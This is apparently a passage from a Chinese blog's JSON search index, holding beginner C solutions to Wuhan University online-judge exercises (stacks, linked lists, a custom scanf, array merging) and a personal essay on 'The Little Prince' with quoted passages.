#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int *a; int top; int push(int vol,int id) { if(top\u0026gt;vol-2) { return 1; } else { a[++top]=id; return 0; } } int pop(int vol) { if(top==-1) { return 1; } else { top--; return 0; } } //int debug() //{ // int i=top; // printf(\u0026#34;top=%d\\t\u0026#34;,top); // while(i\u0026gt;-1){ // printf(\u0026#34;%d \u0026#34;,a[i--]); // } // printf(\u0026#34;\\n\u0026#34;); // return 0; //} int main() { int n,m,op,id,i; while(scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;m)==2) { a=(int*)malloc(sizeof(int)*n); top=-1; while(m--\u0026gt;0) { scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;op,\u0026amp;id); if(op==1) { push(n,id); //debug(); } else if(op==2) { pop(n); //debug(); } else { continue; } } if(top==-1){printf(\u0026#34;NULL\u0026#34;);} while(top\u0026gt;-1) { printf(\u0026#34;%d \u0026#34;,a[top--]); } printf(\u0026#34;\\n\u0026#34;); free(a); } return 0; } 1066判断点是否在圆上 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; typedef struct { double x; double y; }POINT; typedef struct { double m; double n; double r; }CIRCLE; int in_circle(POINT p, CIRCLE c) { double temp1=(p.x-c.m)*(p.x-c.m)+(p.y-c.n)*(p.y-c.n); double temp2=c.r*c.r; if(temp1-temp2\u0026gt;0){return 0;} else if(temp1-temp2\u0026lt;0){return 2;} else {return 1;} } int main() { POINT p; CIRCLE c; while(scanf(\u0026#34;%lf%lf%lf%lf%lf\u0026#34;,\u0026amp;p.x,\u0026amp;p.y,\u0026amp;c.m,\u0026amp;c.n,\u0026amp;c.r)==5) { printf(\u0026#34;%d\\n\u0026#34;,in_circle(p,c)); } return 0; } 1067字节输出 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include\u0026lt;stdio.h\u0026gt; union my_union { int a; unsigned char b[sizeof(int)]; }; int main() { int i; union my_union test; while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;test.a)==1){ for(i=0;i\u0026lt;sizeof(int);i++){ printf(\u0026#34;%.2X\u0026#34;,test.b[i]); }printf(\u0026#34;\\n\u0026#34;); } return 0; } 1068链表基本操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; typedef struct NODE { int val; struct NODE* next; } node; node *head; int addNode(idx,val) { node *p=head; node*q; int i=0; while(i!=idx\u0026amp;\u0026amp;p!=NULL) { p=p-\u0026gt;next; i++; } if(p==NULL) { return 0; } q=(node*)malloc(sizeof(node)); q-\u0026gt;val=val; if(p-\u0026gt;next==NULL) { p-\u0026gt;next=q; q-\u0026gt;next=NULL; } else { q-\u0026gt;next=p-\u0026gt;next; p-\u0026gt;next=q; } return 0; } int editNode(idx,val) { node* p=head; int i=0; while(i!=idx\u0026amp;\u0026amp;p!=NULL) { p=p-\u0026gt;next; i++; } if(p==NULL) { return 0; } p-\u0026gt;val=val; return 0; } int delNode(idx) { node* p=head; node*q; int i=0; while(i!=idx\u0026amp;\u0026amp;p!=NULL) { q=p; p=p-\u0026gt;next; i++; } if(p==NULL) { return 0; } q-\u0026gt;next=p-\u0026gt;next; free(p); return 0; } int appearNode(int idx) { node* p=head; int i=0; while(i!=idx\u0026amp;\u0026amp;p!=NULL) { p=p-\u0026gt;next; i++; } if(p==NULL) { return 0; } printf(\u0026#34;%d\\n\u0026#34;,p-\u0026gt;val); return 0; } //int debug() //{ // node* p=head; // while(p!=NULL){ // printf(\u0026#34;%d-\u0026gt;\u0026#34;,p-\u0026gt;val);p=p-\u0026gt;next; // }printf(\u0026#34;\\n\u0026#34;); // return 0; //} int main() { int op,idx,val; head=(node*)malloc(sizeof(node)); head-\u0026gt;next=NULL; head-\u0026gt;val=111; while(scanf(\u0026#34;%d%d%d\u0026#34;,\u0026amp;op,\u0026amp;idx,\u0026amp;val)==3) { if(op!=1\u0026amp;\u0026amp;op!=2\u0026amp;\u0026amp;op!=3\u0026amp;\u0026amp;op!=4) { continue; } else if(op==1) { addNode(idx,val); //debug(); } else if(op==2) { editNode(idx,val); //debug(); } else if(op==3) { delNode(idx); //debug(); } else { appearNode(idx); } } return 0; } 1069浮点精确数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; int main() { int p; double a,b,delta; while(scanf(\u0026#34;%d%lf%lf\u0026#34;,\u0026amp;p,\u0026amp;a,\u0026amp;b)==3) { delta=1.0; while(p--\u0026gt;0){delta/=10;} if(fabs(a-b)\u0026lt;delta){printf(\u0026#34;0\\n\u0026#34;);} else if(a-b\u0026lt;0){printf(\u0026#34;-1\\n\u0026#34;);} else{printf(\u0026#34;1\\n\u0026#34;);} } return 0; } 1070三角形归类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; void my_sort(int *a,int *b,int *c) { int temp; if(*a\u0026gt;*b){temp=*a;*a=*b;*b=temp;} if(*a\u0026gt;*c){temp=*a;*a=*c;*c=temp;} if(*b\u0026gt;*c){temp=*b;*b=*c;*c=temp;} } int is_triangle(int a,int b,int c) { if(a+b\u0026gt;c){return 1;} else{ printf(\u0026#34;not a triangle\u0026#34;);return 0; } } void choose_angle(int a,int b,int c) { if(c*c-a*a-b*b\u0026gt;0){printf(\u0026#34;obtuse \u0026#34;);} else if(c*c-a*a-b*b==0){printf(\u0026#34;right \u0026#34;);} else{printf(\u0026#34;acute \u0026#34;);} } void choose_edge(int a,int b,int c) { if(a!=b\u0026amp;\u0026amp;b!=c){printf(\u0026#34;scalene\u0026#34;);return;} if(a==b\u0026amp;\u0026amp;b==c){printf(\u0026#34;equilateral\u0026#34;);return;} if(a==b||b==c){printf(\u0026#34;isosceles\u0026#34;);return;} } int main() { int a,b,c; while(scanf(\u0026#34;%d%d%d\u0026#34;,\u0026amp;a,\u0026amp;b,\u0026amp;c)==3){ my_sort(\u0026amp;a,\u0026amp;b,\u0026amp;c);//按非递减排序 if(is_triangle(a,b,c)){//判断是否构成三角形 choose_angle(a,b,c);//按最大角类型分类 choose_edge(a,b,c);//按照边长类型分类 } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1071字符串串烧 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #include\u0026lt;stdio.h\u0026gt; #define N 210 void getnchar(char *str, int n) { int i; for(i=0; i\u0026lt;n-1;) { str[i]=getchar(); if(str[i]==\u0026#39;\\n\u0026#39;) { break; } i++; } str[i]=\u0026#39;\\0\u0026#39;; } int my_strlen(char *str) { int len=0; while(str[len]!=\u0026#39;\\0\u0026#39;) { len++; } return len; } int my_strncat(char *dest, char *src, int n) { int i=my_strlen(dest),j=my_strlen(src),k; for(k=0; k\u0026lt;j\u0026amp;\u0026amp;k\u0026lt;n; k++) { dest[i+k]=src[k]; } dest[i+k]=\u0026#39;\\0\u0026#39;; return k; } int my_strspn(char *str, char *keys) { int i=0,j; while(str[i]!=\u0026#39;\\0\u0026#39;) { j=0; while(keys[j]!=\u0026#39;\\0\u0026#39;) { if(keys[j]==str[i]) { break; } j++; } if(keys[j]==\u0026#39;\\0\u0026#39;) { break; } i++; } return i; } int main() { int nCase,x; char a[N],b[N],c[N]; scanf(\u0026#34;%d\u0026#34;,\u0026amp;nCase); getchar(); while(nCase--) { getnchar(a,N); getnchar(b,N); getnchar(c,N); scanf(\u0026#34;%d\u0026#34;,\u0026amp;x); getchar(); printf(\u0026#34;%d\\n\u0026#34;,my_strlen(a)); printf(\u0026#34;%d %s\\n\u0026#34;,my_strncat(a,b,x),a); printf(\u0026#34;%d\\n\u0026#34;,my_strspn(b,c)); } return 0; } 1072石敢腐include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #define N 110 #define D debug(); #define E debug1(); void get_space()//取走所有空白字符 { char temp; while(1) { temp=getchar(); if(temp==\u0026#39; \u0026#39;||temp==\u0026#39;\\t\u0026#39;||temp==\u0026#39;\\n\u0026#39;) { continue; } else { ungetc(temp,stdin); break; } } } void debug() { printf(\u0026#34;I am here\\n\u0026#34;); } void debug1() { printf(\u0026#34;#\\n\u0026#34;); } int shiganfu(const char *format, void *ptr) { char *a,b; int temp,i,j,k; if(strcmp(format,\u0026#34;%d\u0026#34;)==0) { get_space(); b=getchar(); if(b==EOF) { return EOF; } if(b\u0026lt;\u0026#39;0\u0026#39;||b\u0026gt;\u0026#39;9\u0026#39;) { ungetc(b,stdin); return 0; } ungetc(b,stdin); i=temp=0; a=(char *)ptr; while(1) { a[i]=getchar(); if(a[i]\u0026lt;\u0026#39;0\u0026#39;||a[i]\u0026gt;\u0026#39;9\u0026#39;) { if(a[i]!=EOF) { ungetc(a[i],stdin); } for(j=1,i--; i\u0026gt;-1; i--) { temp=temp+j*(a[i]-\u0026#39;0\u0026#39;); j*=10; } *(int *)ptr=temp; return 1; } i++; } } else if(strcmp(format,\u0026#34;%c\u0026#34;)==0) { getchar(); b=getchar(); if(b==EOF) { return EOF; } else { *(char*)ptr=b; return 1; } } else if(strcmp(format,\u0026#34;%s\u0026#34;)==0) { get_space(); b=getchar(); if((b)==EOF) { return -1; } ungetc(b,stdin); a=(char *)ptr; i=0; while(1) { a[i]=getchar(); if(a[i]==\u0026#39; \u0026#39;||a[i]==\u0026#39;\\t\u0026#39;||a[i]==\u0026#39;\\n\u0026#39;) { ungetc(a[i],stdin); a[i]=\u0026#39;\\0\u0026#39;; return 1; } if(a[i]==EOF) { a[i]=\u0026#39;\\0\u0026#39;; return 1; } i++; } } else if(strcmp(format,\u0026#34;\\\\n\u0026#34;)==0) { while(1) { b=getchar(); if(b==\u0026#39; \u0026#39;||b==\u0026#39;\\t\u0026#39;||b==\u0026#39;\\n\u0026#39;) { continue; } else if(b==EOF) { return 0; } else { ungetc(b,stdin); return 0; } } } else { return -3; } } int main() { // char s,t,r;while(1){ // s=getchar();printf(\u0026#34;%c**HAHA!1\\n\u0026#34;,s); // t=getchar();printf(\u0026#34;%c**HAHA!2\\n\u0026#34;,t); // r=getchar();printf(\u0026#34;%d**HAHA!3\\n\u0026#34;,r); // if(s==EOF){printf(\u0026#34;%d**HAHA!4\\n\u0026#34;,s);} // getchar(); printf(\u0026#34;HAHA5!\\n\u0026#34;);} // ////测试ctrl+z的问题 void *ptr=malloc(sizeof(char)*N); char format[10]; int i,ret; while(1) { get_space(); // i=0; // while(1) // { // format[i]=getchar(); // if(format[i]==\u0026#39; \u0026#39;||i==2) // { // format[i]=\u0026#39;\\0\u0026#39;; // break; // } // else // { // i++; // } // } // //puts(format); format[0]=getchar(); if(format[0]==EOF) { break; } else { format[1]=getchar(); format[2]=\u0026#39;\\0\u0026#39;; ret=-10; ret=shiganfu(format,ptr); printf(\u0026#34;%d\u0026#34;,ret); if(ret==1) { if(strcmp(format,\u0026#34;%s\u0026#34;)==0) { printf(\u0026#34; %s\u0026#34;,(char*)ptr); } else if(strcmp(format,\u0026#34;%d\u0026#34;)==0) { printf(\u0026#34; %d\u0026#34;,*(int*)ptr); } else if(strcmp(format,\u0026#34;%c\u0026#34;)==0) { printf(\u0026#34; %c\u0026#34;,*(char*)ptr); } else ; } printf(\u0026#34;\\n\u0026#34;); } } free(ptr); return 0; } 1073合并有序数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include\u0026lt;stdio.h\u0026gt; #define N 1000000 int main() { int n; long long s,t,i,j; int a[N]; int b[N]; for(i=0;i\u0026lt;N;i++){a[i]=b[i]=0;} scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); while(n--\u0026gt;0){ scanf(\u0026#34;%lld\u0026#34;,\u0026amp;s); for(i=0;i\u0026lt;s\u0026amp;\u0026amp;i\u0026lt;N;i++){scanf(\u0026#34;%d\u0026#34;,\u0026amp;a[i]); //printf(\u0026#34;s=%lld\\ti=%lld\\ta[%lld]=%d\\n\u0026#34;,s,i,i,a[i]); } scanf(\u0026#34;%lld\u0026#34;,\u0026amp;t); for(i=0;i\u0026lt;t\u0026amp;\u0026amp;i\u0026lt;N;i++){scanf(\u0026#34;%d\u0026#34;,\u0026amp;b[i]); //printf(\u0026#34;t=%lld\\ti=%lld\\tb[%lld]=%d\\n\u0026#34;,t,i,i,b[i]); } for(i=0,j=0;i\u0026lt;s\u0026amp;\u0026amp;j\u0026lt;t;){ if(a[i]\u0026lt;b[j]||a[i]==b[j]){ printf(\u0026#34;%d \u0026#34;,a[i]); if(a[i]==b[j]){j++;} i++; } else{ while(a[i]\u0026gt;b[j]\u0026amp;\u0026amp;j\u0026lt;t\u0026amp;\u0026amp;i\u0026lt;s){ printf(\u0026#34;%d \u0026#34;,b[j]); j++; } } } if(i\u0026gt;s-1){ while(j\u0026lt;t){printf(\u0026#34;%d \u0026#34;,b[j]);j++;} } if(j\u0026gt;t-1){ while(i\u0026lt;s){printf(\u0026#34;%d \u0026#34;,a[i]);i++;} } if(i\u0026gt;s-1\u0026amp;\u0026amp;j\u0026gt;t-1){printf(\u0026#34;\\n\u0026#34;);} } return 0; } 完美字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include\u0026lt;stdio.h\u0026gt; int main(){ char s[10001]; int times[26]={0}; int timesTemp; long ans=0; int count=0,count1; gets(s); while(s[count]!=\u0026#39;\\0\u0026#39;){ times[(s[count]-\u0026#39;A\u0026#39;)%32]++; count ++; } for(count=0;count\u0026lt;26;count++){ for(count1=count+1;count1\u0026lt;26;count1++){ if(times[count]\u0026lt;times[count1]){ timesTemp=times[count];times[count]=times[count1];times[count1]=timesTemp; } } } timesTemp=26; for(count=0;count\u0026lt;26;count++){ ans=ans+timesTemp*times[count]; timesTemp--; } printf(\u0026#34;%ld\u0026#34;,ans); } ","permalink":"https://ret2neo.cn/post/160820whuojstarter/","summary":"WHU OJ ，已无法访问\n1021乒乓球比赛 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include\u0026lt;stdio.h\u0026gt; int main() { char i,j,k; for(i=\u0026#39;X\u0026#39;; i\u0026lt;\u0026#39;X\u0026#39;+3; i++) { for(j=\u0026#39;X\u0026#39;; j\u0026lt;\u0026#39;X\u0026#39;+3; j++) { for(k=\u0026#39;X\u0026#39;; k\u0026lt;\u0026#39;X\u0026#39;+3; k++) { if(j!=i\u0026amp;\u0026amp;k!=i\u0026amp;\u0026amp;k!=j) { printf(\u0026#34;%c %c\\n%c %c\\n%c %c\\n\u0026#34;,\u0026#39;A\u0026#39;,i,\u0026#39;B\u0026#39;,j,\u0026#39;C\u0026#39;,k); } } } } for(i=\u0026#39;X\u0026#39;; i\u0026lt;\u0026#39;X\u0026#39;+3; i++) { for(j=\u0026#39;X\u0026#39;; j\u0026lt;\u0026#39;X\u0026#39;+3; j++) { for(k=\u0026#39;X\u0026#39;; k\u0026lt;\u0026#39;X\u0026#39;+3; k++) { if(j!","title":"武汉大学C语言上机训练系统练习"},{"content":"小王子终要长大 素闻大名，今日得见，这童话，确只有大人能读懂。悲哀的是，看懂的大人们只能苦笑，醒悟过来了却立马又为醒悟本身觉得不好意思，骚情一些的还会感到失落无奈呢，好比秒懂黄色笑话带来的尴尬，所幸四下无人，我也便笑笑不说话。\n故事背景预设颇为离奇，亦真亦幻，主人公遇见小王子，然后转述小王子对他说的故事，于是，鞭笞大人们的皮鞭开始一下一下地落下去。\n小王子来自异星球，有一朵傲娇的花，两座可以做饭的活火山，一座可以当做座椅的死火山，火山们必须常常被清理，猴面包树的小苗子也是。然而小王子对一些无关紧要的话看的太认真，结果使自己很苦恼，也因此和心爱的花闹了别扭，于是他决定去拜访其他星球，找点事做，学习学习。以下是他依次拜访的行星。\n第一个星球上有一个国王，热衷于荒唐的权利，发布着可笑的命令，自以为能令行天下，实则只是自然的傀儡，狐假虎威，无所作为，通过号称占有整个宇宙来获得快感却甚至从未视差走访过所谓的辖区，不知是否是我多虑，暗中所指恐怕政治性不当。\n第二个星球上是一个爱虚荣的人，他的人生只看到虚无的荣耀，再无其他。\n第三个，酒鬼，沉浸在回忆中无法自拔，为为喝酒而羞愧，为忘却羞愧而喝酒。\n第四个，实业家，暗讽了资本家的荒谬，虚无的占有。\n第五个，点灯人，对生活节奏加快的夸张表述和反思，对成为牺牲品的劳苦大众的尊敬和怜悯，对民智不开的无奈。在这里日子过得快，小王子爱的却是每小时1440次的落日。\n第六个，地理学家，让我猜猜看，说的是学者的闭门造车，古板生硬吧，还妄图要写永恒的东西，那么小王子便问了，什么是短暂？\n第七个，地球。蛇告诉他，在人群中你一样会孤独。三枚花瓣的小花说人类在风中飘来飘去，没有根是他们最大的不便。狐狸当了小三，和小王子谈了一场文艺青年之间的恋爱。扳道工说开车人也不知道要去哪里。卖止渴药的商人也蛮有意思。然后是分别，就好像剥落旧树皮一样，旧树皮并没有什么可悲的。\n私以为，这样荒诞而模棱两可的文字最值得捉摸感慨，最是意味深长，也最可解释，因此最容易反映一个人内心的阴暗程度，一千个人有一千个黄色笑话，无怪乎闻名遐迩，只是其中用心，懂又如何，不懂又如何，微弱的呼唤并不足以阻挡时代轰隆隆滚动前进着的巨轮，毕竟开列车的人也不知道要去哪里，毕竟我也已经自测心里脏的很呢。所以，这时代，大可以出轨翻车，一了百了，停下是万万不能的，毕竟，远处还有孩子们想要的布娃娃呢。\n附上摘抄: 《小王子》摘抄: 1.小孩子们对大人们应该宽厚些，不要埋怨他们。\n2.忘记一个朋友，这太叫人悲伤了。并不是所有的人都有过一个朋友。\n3.再说，我也可能变成那些大人那样，只对数字感兴趣。\n4.我大概有点和大人们差不多。我一定是变老了。\n5.有时候，人们把自己的工作推到以后去做，并没有什么妨害，但要遇到拔猴面包树苗这种事，那就非造成大灾难不可。\n“一天，我看见过四十三次日落。”过一会儿，你又说：“你知道，当人们感到非常苦闷时，总是喜欢日落的。”“一天四十三次，你怎么会这么苦闷？”小王子没有回答。 7.“你说话就和那些大人一样！”这话使我有点难堪。可是他又尖刻无情地说道：“你什么都分不清…你把什么都混在一起！”\n8.小王子对一些无关紧要的话看得太认真，结果使自己很苦恼。\n9.“我那时什么也不懂！我应该根据她的行为，而不是根据她的话来判断她。她使我的生活芬芳多彩，我真不该离开她跑出来。我本应该猜出在她那令人爱怜的花招后面所隐藏的温情。花是多么自相矛盾！我当时太年青，还不懂得爱她。”\n“我要是想认识蝴蝶，经不起两三只尺蠖是不行的。 11.国王接着说，“向每个人提出的要求应该是他们所能做到的。权威首先应该建立在理性的基础上。\n12.一旦他提出了一个问题，是从来也不会放弃的。\n13.地球可不是一颗普通的行星！它上面有一百一十一个国王（当然，没有漏掉黑人国王），七千个地理学家，九十万个实业家，七百五十万个酒鬼，三亿一千一百万个爱虚荣的人。\n14.到了有人的地方，你一样孤独。蛇对小王子说。\n15.花评价人，他们没有根，风吹着他们到处跑，这对他们是很不方便的。\n16.“你们是什么人？”小王子问。“你们是什么人…你们是什么人…你们是什么人…”回音又回答道。“请你们做我的朋友吧，我很孤独。”他说。“我很孤独…我很孤独…我很孤独…”回音又回答着。小王子想道：“这颗行星真奇怪！它上面全是干巴巴的，而且又尖利又咸涩，人们一点想象力都没有。他们只是重复别人对他们说的话…在我的家乡，我有一 朵花。她总是自己先说话…\n17.“我还以为我有一朵独一无二的花呢，我有的仅是一朵普通的花。这朵花，再加上三座只有我膝盖那么高的火山，而且其中一座还可能是永远熄灭了的，这一切不会使我成为一个了不起的王子…”于是，他躺在草丛中哭泣起来。\n18.驯服就是建立联系。对我来说，你还只是一个小男孩，就像其他千万个小男孩一样。我不需要你。你也同样用不着我。对你来说，我也不过是一只狐狸，和其他千万只狐狸一样。但是，如果你驯服了我，我们就互相不可缺少了。对我来说，你就是世界上唯一的了；我对你来说，也是世界上唯一的了。”“我有点明白了。”小王子说，“有一朵花…，我想，她把我驯服了…”\n19.驯服，仪式，都是早已被人忘却的事情了。\n20.这就是你的过错，我本来并不想给你带来任何痛苦，可你却要我驯服你。\n21.只有用心才能看见实质性的东西。用眼睛是看不见的。眼睛是什么也看不见的，应该用心去寻找。\n22.你要对你驯服过的一切负责到底。\n26.人们已经忘记了这个道理，可你不该忘记它。\n27.你也渴吗？水对心也是有益处的。\n28.是的，无论是房子，星星，或是沙漠，使它们美丽的东西是看不见的！”\n29.我想起了狐狸的话，如果被人驯服了，就可能会要哭的……\n30.我很高兴，你找到了你的机器所缺少的东西，很快你就可以回家去了。\n31.这就好象我并没有给你星星，而是给你一大堆会笑出声来的小铃铛…”\n32.但是，这就好像剥落的旧树皮一样。旧树皮，并没有什么可悲的。\n33.这时，他也沉默了，因为他在哭。\n34.那些人们啊，他们往快车里拥挤，但是他们却不知道要寻找什么。于是，他们就忙忙碌碌，来回转圈子…”小王子说道。他接着又说:“这没有必要…”\n35.他们真匆忙呀，”小王子说，“他们要寻找什么？”“开机车的人自己也不知道。”扳道工说道。于是，第二列灯火通明的快车又朝着相反的方向轰隆轰隆地开过去。“他们怎么又回来了呢？”小王子问道。“他们不是原来那些人了。”扳道工说，“这是一次对开列车。”“他们不满意他们原来所住的地方吗？”“人们是从来也不会满意自己所在的地方的。”扳道工说。此时，第三趟灯火明亮的快车又隆隆而过。“他们是在追随第一批旅客吗？”小王子问道。“他们什么也不追随。”扳道工说，“他们在里面睡觉，或是在打哈欠。只有孩子们把鼻子贴在玻璃窗上往外看。”“只有孩子知道他们自己在寻找什么。”小王子说，“他们为一个布娃娃花费不少时间，这个布娃娃就成了很重要的东西，如果有人夺走的他们的布娃娃，他们就哭泣…”“他们真幸运。”扳道工说。\n","permalink":"https://ret2neo.cn/mind/160806prince/","summary":"小王子终要长大 素闻大名，今日得见，这童话，确只有大人能读懂。悲哀的是，看懂的大人们只能苦笑，醒悟过来了却立马又为醒悟本身觉得不好意思，骚情一些的还会感到失落无奈呢，好比秒懂黄色笑话带来的尴尬，所幸四下无人，我也便笑笑不说话。\n故事背景预设颇为离奇，亦真亦幻，主人公遇见小王子，然后转述小王子对他说的故事，于是，鞭笞大人们的皮鞭开始一下一下地落下去。\n小王子来自异星球，有一朵傲娇的花，两座可以做饭的活火山，一座可以当做座椅的死火山，火山们必须常常被清理，猴面包树的小苗子也是。然而小王子对一些无关紧要的话看的太认真，结果使自己很苦恼，也因此和心爱的花闹了别扭，于是他决定去拜访其他星球，找点事做，学习学习。以下是他依次拜访的行星。\n第一个星球上有一个国王，热衷于荒唐的权利，发布着可笑的命令，自以为能令行天下，实则只是自然的傀儡，狐假虎威，无所作为，通过号称占有整个宇宙来获得快感却甚至从未视差走访过所谓的辖区，不知是否是我多虑，暗中所指恐怕政治性不当。\n第二个星球上是一个爱虚荣的人，他的人生只看到虚无的荣耀，再无其他。\n第三个，酒鬼，沉浸在回忆中无法自拔，为为喝酒而羞愧，为忘却羞愧而喝酒。\n第四个，实业家，暗讽了资本家的荒谬，虚无的占有。\n第五个，点灯人，对生活节奏加快的夸张表述和反思，对成为牺牲品的劳苦大众的尊敬和怜悯，对民智不开的无奈。在这里日子过得快，小王子爱的却是每小时1440次的落日。\n第六个，地理学家，让我猜猜看，说的是学者的闭门造车，古板生硬吧，还妄图要写永恒的东西，那么小王子便问了，什么是短暂？\n第七个，地球。蛇告诉他，在人群中你一样会孤独。三枚花瓣的小花说人类在风中飘来飘去，没有根是他们最大的不便。狐狸当了小三，和小王子谈了一场文艺青年之间的恋爱。扳道工说开车人也不知道要去哪里。卖止渴药的商人也蛮有意思。然后是分别，就好像剥落旧树皮一样，旧树皮并没有什么可悲的。\n私以为，这样荒诞而模棱两可的文字最值得捉摸感慨，最是意味深长，也最可解释，因此最容易反映一个人内心的阴暗程度，一千个人有一千个黄色笑话，无怪乎闻名遐迩，只是其中用心，懂又如何，不懂又如何，微弱的呼唤并不足以阻挡时代轰隆隆滚动前进着的巨轮，毕竟开列车的人也不知道要去哪里，毕竟我也已经自测心里脏的很呢。所以，这时代，大可以出轨翻车，一了百了，停下是万万不能的，毕竟，远处还有孩子们想要的布娃娃呢。\n附上摘抄: 《小王子》摘抄: 1.小孩子们对大人们应该宽厚些，不要埋怨他们。\n2.忘记一个朋友，这太叫人悲伤了。并不是所有的人都有过一个朋友。\n3.再说，我也可能变成那些大人那样，只对数字感兴趣。\n4.我大概有点和大人们差不多。我一定是变老了。\n5.有时候，人们把自己的工作推到以后去做，并没有什么妨害，但要遇到拔猴面包树苗这种事，那就非造成大灾难不可。\n“一天，我看见过四十三次日落。”过一会儿，你又说：“你知道，当人们感到非常苦闷时，总是喜欢日落的。”“一天四十三次，你怎么会这么苦闷？”小王子没有回答。 7.“你说话就和那些大人一样！”这话使我有点难堪。可是他又尖刻无情地说道：“你什么都分不清…你把什么都混在一起！”\n8.小王子对一些无关紧要的话看得太认真，结果使自己很苦恼。\n9.“我那时什么也不懂！我应该根据她的行为，而不是根据她的话来判断她。她使我的生活芬芳多彩，我真不该离开她跑出来。我本应该猜出在她那令人爱怜的花招后面所隐藏的温情。花是多么自相矛盾！我当时太年青，还不懂得爱她。”\n“我要是想认识蝴蝶，经不起两三只尺蠖是不行的。 11.国王接着说，“向每个人提出的要求应该是他们所能做到的。权威首先应该建立在理性的基础上。\n12.一旦他提出了一个问题，是从来也不会放弃的。\n13.地球可不是一颗普通的行星！它上面有一百一十一个国王（当然，没有漏掉黑人国王），七千个地理学家，九十万个实业家，七百五十万个酒鬼，三亿一千一百万个爱虚荣的人。\n14.到了有人的地方，你一样孤独。蛇对小王子说。\n15.花评价人，他们没有根，风吹着他们到处跑，这对他们是很不方便的。\n16.“你们是什么人？”小王子问。“你们是什么人…你们是什么人…你们是什么人…”回音又回答道。“请你们做我的朋友吧，我很孤独。”他说。“我很孤独…我很孤独…我很孤独…”回音又回答着。小王子想道：“这颗行星真奇怪！它上面全是干巴巴的，而且又尖利又咸涩，人们一点想象力都没有。他们只是重复别人对他们说的话…在我的家乡，我有一 朵花。她总是自己先说话…\n17.“我还以为我有一朵独一无二的花呢，我有的仅是一朵普通的花。这朵花，再加上三座只有我膝盖那么高的火山，而且其中一座还可能是永远熄灭了的，这一切不会使我成为一个了不起的王子…”于是，他躺在草丛中哭泣起来。\n18.驯服就是建立联系。对我来说，你还只是一个小男孩，就像其他千万个小男孩一样。我不需要你。你也同样用不着我。对你来说，我也不过是一只狐狸，和其他千万只狐狸一样。但是，如果你驯服了我，我们就互相不可缺少了。对我来说，你就是世界上唯一的了；我对你来说，也是世界上唯一的了。”“我有点明白了。”小王子说，“有一朵花…，我想，她把我驯服了…”\n19.驯服，仪式，都是早已被人忘却的事情了。\n20.这就是你的过错，我本来并不想给你带来任何痛苦，可你却要我驯服你。\n21.只有用心才能看见实质性的东西。用眼睛是看不见的。眼睛是什么也看不见的，应该用心去寻找。\n22.你要对你驯服过的一切负责到底。\n26.人们已经忘记了这个道理，可你不该忘记它。\n27.你也渴吗？水对心也是有益处的。\n28.是的，无论是房子，星星，或是沙漠，使它们美丽的东西是看不见的！”\n29.我想起了狐狸的话，如果被人驯服了，就可能会要哭的……\n30.我很高兴，你找到了你的机器所缺少的东西，很快你就可以回家去了。\n31.这就好象我并没有给你星星，而是给你一大堆会笑出声来的小铃铛…”\n32.但是，这就好像剥落的旧树皮一样。旧树皮，并没有什么可悲的。\n33.这时，他也沉默了，因为他在哭。\n34.那些人们啊，他们往快车里拥挤，但是他们却不知道要寻找什么。于是，他们就忙忙碌碌，来回转圈子…”小王子说道。他接着又说:“这没有必要…”\n35.他们真匆忙呀，”小王子说，“他们要寻找什么？”“开机车的人自己也不知道。”扳道工说道。于是，第二列灯火通明的快车又朝着相反的方向轰隆轰隆地开过去。“他们怎么又回来了呢？”小王子问道。“他们不是原来那些人了。”扳道工说，“这是一次对开列车。”“他们不满意他们原来所住的地方吗？”“人们是从来也不会满意自己所在的地方的。”扳道工说。此时，第三趟灯火明亮的快车又隆隆而过。“他们是在追随第一批旅客吗？”小王子问道。“他们什么也不追随。”扳道工说，“他们在里面睡觉，或是在打哈欠。只有孩子们把鼻子贴在玻璃窗上往外看。”“只有孩子知道他们自己在寻找什么。”小王子说，“他们为一个布娃娃花费不少时间，这个布娃娃就成了很重要的东西，如果有人夺走的他们的布娃娃，他们就哭泣…”“他们真幸运。”扳道工说。","title":"《小王子》"},{"content":"指归夜话 